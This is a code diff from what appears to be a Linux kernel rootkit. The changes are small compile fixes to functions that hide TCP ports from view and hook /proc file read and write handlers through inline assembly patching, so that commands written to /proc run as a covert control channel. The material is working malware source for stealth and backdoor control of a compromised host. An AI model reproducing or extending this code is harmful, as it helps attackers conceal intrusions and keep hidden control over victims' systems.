@@ -423,14 +423,12 @@ void hide_tcp4_port(const char *port)
 
     hp = kmalloc(sizeof(*hp), GFP_KERNEL);
     if ( ! hp )
-        return 0;
+        return;
 
     //hp->port = port;
     hp->port = simple_strtoul(port, NULL, 10);
 
     list_add(&hp->list, &hidden_tcp4_ports);
-	
-    return 1;
 }
 
 void unhide_tcp4_port(const char *port)
@@ -1074,11 +1072,12 @@ int execute_command(const char __user *str, size_t length)
 
 static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
 {
+    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
+	
     if (execute_command(buf_user, count)) {
         return count;
     }
 
-    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
     original_write = asm_hook_unpatch(proc_fops_write);
     ssize_t ret = original_write(file, buf_user, count, p);
     asm_hook_patch(proc_fops_write);
@@ -1088,9 +1087,10 @@ static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, s
 
 static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
 {
+    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
+	
     execute_command(buf_user, count);
 
-    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
     original_read = asm_hook_unpatch(proc_fops_read);
     ssize_t ret = original_read(file, buf_user, count, p);
     asm_hook_patch(proc_fops_read);
